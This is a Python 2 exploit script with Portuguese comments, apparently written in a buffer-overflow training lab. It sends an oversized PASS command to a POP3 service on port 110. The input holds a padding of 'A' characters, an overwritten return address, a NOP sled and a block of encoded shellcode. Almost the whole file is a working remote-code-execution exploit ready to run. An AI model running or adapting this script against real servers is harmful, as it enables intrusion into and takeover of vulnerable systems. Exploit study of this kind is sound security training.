#!/usr/bin/python

import socket

#Vamos agora validar o endereco de retorno que no caso e 5F4A358F so que na memoria tem de ser invertido, pois o formato e o Little Endian ficando 8F354A5F 
#bytes = 'A' * 2607 + '\x8F\x35\x4A\x5F' + 'C' * 389

#bytes = 'A' * 2606 + '\x8F\x35\x4A\x5F' + 'C' * 390

shell =  ""
shell += "\xbe\xf0\x25\xc1\xe7\xda\xdb\xd9\x74\x24\xf4\x5d\x2b"
shell += "\xc9\xb1\x52\x31\x75\x12\x83\xc5\x04\x03\x85\x2b\x23"
shell += "\x12\x99\xdc\x21\xdd\x61\x1d\x46\x57\x84\x2c\x46\x03"
shell += "\xcd\x1f\x76\x47\x83\x93\xfd\x05\x37\x27\x73\x82\x38"
shell += "\x80\x3e\xf4\x77\x11\x12\xc4\x16\x91\x69\x19\xf8\xa8"
shell += "\xa1\x6c\xf9\xed\xdc\x9d\xab\xa6\xab\x30\x5b\xc2\xe6"
shell += "\x88\xd0\x98\xe7\x88\x05\x68\x09\xb8\x98\xe2\x50\x1a"
shell += "\x1b\x26\xe9\x13\x03\x2b\xd4\xea\xb8\x9f\xa2\xec\x68"
shell += "\xee\x4b\x42\x55\xde\xb9\x9a\x92\xd9\x21\xe9\xea\x19"
shell += "\xdf\xea\x29\x63\x3b\x7e\xa9\xc3\xc8\xd8\x15\xf5\x1d"
shell += "\xbe\xde\xf9\xea\xb4\xb8\x1d\xec\x19\xb3\x1a\x65\x9c"
shell += "\x13\xab\x3d\xbb\xb7\xf7\xe6\xa2\xee\x5d\x48\xda\xf0"
shell += "\x3d\x35\x7e\x7b\xd3\x22\xf3\x26\xbc\x87\x3e\xd8\x3c"
shell += "\x80\x49\xab\x0e\x0f\xe2\x23\x23\xd8\x2c\xb4\x44\xf3"
shell += "\x89\x2a\xbb\xfc\xe9\x63\x78\xa8\xb9\x1b\xa9\xd1\x51"
shell += "\xdb\x56\x04\xf5\x8b\xf8\xf7\xb6\x7b\xb9\xa7\x5e\x91"
shell += "\x36\x97\x7f\x9a\x9c\xb0\xea\x61\x77\x7f\x42\x69\xb8"
shell += "\x17\x91\x69\xe6\x1c\x1c\x8f\x8c\xf2\x49\x18\x39\x6a"
shell += "\xd0\xd2\xd8\x73\xce\x9f\xdb\xf8\xfd\x60\x95\x08\x8b"
shell += "\x72\x42\xf9\xc6\x28\xc5\x06\xfd\x44\x89\x95\x9a\x94"
shell += "\xc4\x85\x34\xc3\x81\x78\x4d\x81\x3f\x22\xe7\xb7\xbd"
shell += "\xb2\xc0\x73\x1a\x07\xce\x7a\xef\x33\xf4\x6c\x29\xbb"
shell += "\xb0\xd8\xe5\xea\x6e\xb6\x43\x45\xc1\x60\x1a\x3a\x8b"
shell += "\xe4\xdb\x70\x0c\x72\xe4\x5c\xfa\x9a\x55\x09\xbb\xa5"
shell += "\x5a\xdd\x4b\xde\x86\x7d\xb3\x35\x03\x8d\xfe\x17\x22"
shell += "\x06\xa7\xc2\x76\x4b\x58\x39\xb4\x72\xdb\xcb\x45\x81"
shell += "\xc3\xbe\x40\xcd\x43\x53\x39\x5e\x26\x53\xee\x5f\x63"


bytes = 'A' * 2607 + '\x8F\x35\x4A\x5F' + '\x90' * 9 + shell

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	s.connect(('192.168.0.104',110))
	r = s.recv(1024)
	print r

	s.send('USER teste\r\n')
	r = s.recv(1024)
	print r

	s.send('PASS' + bytes + '\r\n')
	r = s.recv(1024)
	print r


	s.send('QUIT\r\n')
	r = s.recv(1024)
	print r

except:
	print "Erro ao conectar"		
